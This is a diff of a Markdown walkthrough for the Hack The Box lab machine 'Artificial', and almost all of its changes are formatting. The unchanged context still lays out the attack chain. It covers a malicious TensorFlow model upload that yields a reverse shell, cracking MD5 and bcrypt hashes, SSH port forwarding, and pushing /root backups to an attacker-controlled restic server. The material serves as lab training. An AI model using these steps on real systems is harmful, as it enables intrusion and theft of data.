@@ -1,19 +1,19 @@
 # Artificial
 
-![hackthebox.com - © HACKTHEBOX](<../../../../.gitbook/assets/logo-htb2 (1).png>)
+![hackthebox.com - © HACKTHEBOX](.gitbook/assets/logo-htb2.png)
 
-***
+---
 
 ## Intro
 
-| Box Info            | ![](../../../../.gitbook/assets/artificial.png)       |
-| ------------------- | ----------------------------------------------------- |
+| Box Info           | ![](.gitbook/assets/artificial.png)                   |
+| :----------------- | ----------------------------------------------------- |
 | 🔗 Name             | [Artificial](https://app.hackthebox.com/machines/668) |
 | 🎯 Target IP        | `10.10.11.74`                                         |
-| 📈 Difficulty level | 🟩Easy                                                |
+| 📈 Difficulty level | 🟩Easy                                                 |
 | 🐧OS                | Linux                                                 |
 
-***
+---
 
 ## Recon
 
@@ -65,14 +65,14 @@ sudo sh -c 'echo "10.10.11.74 artificial.htb" >> /etc/hosts' && ping -c 3 artifi
 sudo sed -i '$ d' /etc/hosts
 ```
 
-***
+---
 
-## Exploitation
+## Exploitation 
 
 ### Deserialization RCE via `load_model`
 
-> * [TensorFlow Remote Code Execution with Malicious Model | CyberBlog](https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model)
-> * [GitHub - Splinter0/tensorflow-rce: RCE PoC for Tensorflow using a malicious Lambda layer](https://github.com/Splinter0/tensorflow-rce?tab=readme-ov-file)
+> - [TensorFlow Remote Code Execution with Malicious Model | CyberBlog](https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model)
+> - [GitHub - Splinter0/tensorflow-rce: RCE PoC for Tensorflow using a malicious Lambda layer](https://github.com/Splinter0/tensorflow-rce?tab=readme-ov-file)
 
 **Critical issue:**
 
@@ -80,15 +80,15 @@ sudo sed -i '$ d' /etc/hosts
 model = tf.keras.models.load_model(model_path)
 ```
 
-* Any `.h5` file uploaded by a user is loaded directly
-* This **TensorFlow deserialization vulnerability** lets the user run arbitrary Python code as the web server user
+- Any `.h5` file uploaded by a user is loaded directly
+- This **TensorFlow deserialization vulnerability** lets the user run arbitrary Python code as the web server user
 
 **Impact:** Full remote code execution (**RCE**).
 
 Browse `http://artificial.htb/` and register a user
 
-* Download `Dockerfile` and move it into the artificial directory
-* Let's try the PoC locally with the provided `Dockerfile`
+- Download `Dockerfile` and move it into the artificial directory
+- Let's try the PoC locally with the provided `Dockerfile`
 
 ```bash
 cd $HOME/htb/artificial/
@@ -124,17 +124,17 @@ nc -nvlp 1234
 python3 exploit.py
 ```
 
-* Should receive a shell on the `nc` listener
-* `CTRL+C` to stop
-* `exploit.h5` model is generated
+- Should receive a shell on the `nc` listener
+- `CTRL+C` to stop
+- `exploit.h5` model is generated
 
-![](../../../../.gitbook/assets/2025-06-28_01-05-41_191.png)
+![](.gitbook/assets/2025-06-28_01-05-41_191.png)
 
 Upload the `exploit.h5` model inside `http://artificial.htb/dashboard` with the registered user
 
-![](../../../../.gitbook/assets/2025-06-28_01-07-43_192.png)
+![](.gitbook/assets/2025-06-28_01-07-43_192.png)
 
-***
+---
 
 ## Foothold
 
@@ -161,7 +161,7 @@ drwxr-x---  6 app  app  4.0K Jun  9 10:52 app
 drwxr-x---  4 gael gael 4.0K Jun  9 08:53 gael
 ```
 
-* Set a full interactive TTY Shell
+- Set a full interactive TTY Shell
 
 ```bash
 # Full interactive TTY shell
@@ -438,11 +438,11 @@ There is secret key **hardcoded** in the source:
 hash = hashlib.md5(password).hexdigest()
 ```
 
-* Using **MD5** for password hashing is insecure
-* Can be brute-forced easily
-* No salt
+- Using **MD5** for password hashing is insecure
+- Can be brute-forced easily
+- No salt
 
-***
+---
 
 ## Lateral Movement
 
@@ -456,7 +456,7 @@ file /home/app/app/instance/users.db
 /home/app/app/instance/users.db: SQLite 3.x database, last written using SQLite version 3031001
 ```
 
-* Copy `users.db` to local KaliVM
+- Copy `users.db` to local KaliVM
 
 ```bash
 # KALI
@@ -490,7 +490,7 @@ sqlite> select * from user;
 
 📌 Crack the MD5 hashes
 
-* Create a `hashes.txt` file with `user:hash` values
+- Create a `hashes.txt` file with `user:hash` values
 
 ```bash
 nano hashes.txt
@@ -508,7 +508,7 @@ admin:5f4dcc3b5aa765d61d8327deb882cf99
 test:098f6bcd4621d373cade4e832627b4f6
 ```
 
-* Run `john`
+- Run `john`
 
 ```bash
 john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
@@ -613,11 +613,11 @@ LISTEN     0          511                     [::]:80                   [::]:*
 LISTEN     0          128                     [::]:22                   [::]:* 
 ```
 
-***
+---
 
 ## Privilege Escalation
 
-### backrest\_root Creds bruteforce
+### backrest_root Creds bruteforce
 
 ```bash
 sudo -l
@@ -688,7 +688,7 @@ ls -l /var/backups/backrest_backup.tar.gz
 -rw-r----- 1 root sysadm 52357120 Mar  4 22:19 /var/backups/backrest_backup.tar.gz
 ```
 
-* Copy `backrest_backup.tar.gz` to local KaliVM
+- Copy `backrest_backup.tar.gz` to local KaliVM
 
 ```bash
 # KALI
@@ -745,7 +745,7 @@ echo 'JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWn
 $2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO
 ```
 
-* Crack the **bcrypt** hash
+- Crack the **bcrypt** hash
 
 ```bash
 nano bcrypt.hash
@@ -762,7 +762,7 @@ backrest_root:!@#$%^
 
 ### **SSH Local port forwarding**
 
-* Create a **secure tunnel** between Kali local port `9898` and `127.0.0.1:9898` on the remote machine, to expose the remote **Backrest API** service locally
+- Create a **secure tunnel** between Kali local port `9898` and `127.0.0.1:9898` on the remote machine, to expose the remote **Backrest API** service locally
 
 ```bash
 ssh -L 9898:127.0.0.1:9898 gael@artificial.htb
@@ -771,7 +771,7 @@ ssh -L 9898:127.0.0.1:9898 gael@artificial.htb
 
 Browse to `http://localhost:9898/`
 
-* 📌 use `backrest_root:!@#$%^` credentials to login
+- 📌 use `backrest_root:!@#$%^` credentials to login
 
 ### Restic server and backup exfiltration
 
@@ -785,7 +785,7 @@ mkdir -p /tmp/restic
 rest-server --path /tmp/restic --listen :4444 --no-auth
 ```
 
-* In the BackrestAPI - **Add a Repo**
+- In the BackrestAPI - **Add a Repo**
 
 ```bash
 Repo Name:
@@ -795,16 +795,16 @@ Repository URI:
 rest:http://10.10.14.14:4444/
 ```
 
-* Test the configuration and Submit (save)
+- Test the configuration and Submit (save)
 
-![](../../../../.gitbook/assets/2025-06-28_02-47-32_193.png)
+![](.gitbook/assets/2025-06-28_02-47-32_193.png)
 
 ```bash
 # OUTPUT received on the KALI rest-server
 Creating repository directories in /tmp/restic
 ```
 
-* In the BackrestAPI - **Add a Plan** with the following values and Submit
+- In the BackrestAPI - **Add a Plan** with the following values and Submit
 
 ```bash
 Plan Name:
@@ -817,11 +817,12 @@ Paths:
 /root
 ```
 
-![](../../../../.gitbook/assets/2025-06-28_02-50-15_194.png)
+![](.gitbook/assets/2025-06-28_02-50-15_194.png)
 
-* Run the Backup Plan manually
-  * This will create a snapshot on the Kali Restic Server
-* Restore the backup
+- Run the Backup Plan manually
+  - This will create a snapshot on the Kali Restic Server
+
+- Restore the backup
 
 ```bash
 # KALI
@@ -862,7 +863,7 @@ root@artificial:~# cat root.txt
 bd9b5***************************
 ```
 
-***
+---
 
 ## Post Exploitation
 
@@ -937,19 +938,19 @@ root@artificial:~# cat scripts/config.json
 }
 ```
 
-Why does `cleanup.sh` exist:
+Why does `cleanup.sh ` exist:
 
-* To remove any uploaded files, logs, or traces of exploitation
-* To restore the environment to an expected state every 10 minutes
-* To make persistent compromise harder to maintain
+- To remove any uploaded files, logs, or traces of exploitation
+- To restore the environment to an expected state every 10 minutes
+- To make persistent compromise harder to maintain
 
 What to watch out for if re-exploiting:
 
-* Any malicious files or shells you drop will be deleted within 10 min
-* Evidence in logs or SQLite will be wiped
-* Any config changes will be overwritten
+- Any malicious files or shells you drop will be deleted within 10 min
+- Evidence in logs or SQLite will be wiped
+- Any config changes will be overwritten
 
-***
+---
 
 ## Summary
 
@@ -967,11 +968,12 @@ What to watch out for if re-exploiting:
 12. Used Backrest to **backup `/root` to Kali machine.**
 13. **Restored the backup locally** and retrieved `root.txt`.
 
-***
+---
 
 ## Extra
 
-* [HTB: Artificial | 0xdf hacks stuff](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
-* [Artificial - Ippsec](https://www.youtube.com/watch?v=uGgnWQaG-bA)
+- [HTB: Artificial | 0xdf hacks stuff](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
+- [Artificial - Ippsec](https://www.youtube.com/watch?v=uGgnWQaG-bA)
 
-***
+---
+
